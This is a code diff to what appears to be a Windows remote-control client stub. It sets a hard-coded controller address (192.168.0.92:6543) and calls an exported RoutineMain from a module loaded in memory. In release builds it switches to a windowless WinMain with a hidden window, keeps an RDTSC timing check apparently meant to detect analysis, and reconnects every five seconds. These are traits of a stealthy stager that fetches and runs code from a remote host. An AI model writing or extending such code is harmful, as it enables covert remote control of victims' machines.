@@ -8,7 +8,8 @@
 
 #include "MemLoadDll.h"
 
-CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA("127.0.0.1", 6543);
+// 配置远程主机信息
+CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA("192.168.0.92", 6543);
 
 // 从域名获取IP地址
 inline const char* GetIPAddress(const char* hostName)
@@ -93,7 +94,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
             return 2;
         }
 
-        typedef BOOL(*_RoutineMain)(LPVOID lp);
+        typedef BOOL(WINAPI*_RoutineMain)(LPVOID lp);
 
         _RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
         Err = RoutineMain((LPVOID)&modify_data);
@@ -106,7 +107,11 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
     return Err;
 }
 
-int main()
+#ifdef _DEBUG
+int main() // 调试模式下为控制台程序
+{
+#else
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
                                 L"#32770",
@@ -121,9 +126,8 @@ int main()
                                 GetModuleHandleW(0),
                                 NULL
                                );
-#ifndef _DEBUG
-    ShowWindow(hwnd, SW_HIDE);
-    UpdateWindow(hwnd);
+	ShowWindow(hwnd, SW_HIDE);
+	UpdateWindow(hwnd);
 
     /*
     这段代码的核心功能是测量两次 RDTSC 之间的 CPU 时钟周期差，并根据结果决定程序的运行状态：
@@ -143,6 +147,8 @@ int main()
     }
 OK:
 #endif
+    OutputDebugStringA(">>> Program start RUN \n");
+
     GetInputState();
     PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
 
@@ -152,7 +158,7 @@ OK:
     while (1) {
         __try {
             if (ConnectThread(NULL) == -1) {
-                Mprintf("exiting\n");
+                Mprintf("Client exit normally\n");
                 break;
             }
             Sleep(5000);
@@ -162,6 +168,7 @@ OK:
     }
 
     WSACleanup();
+    OutputDebugStringA(">>> Program stop RUN \n");
 
     return 0;
 }
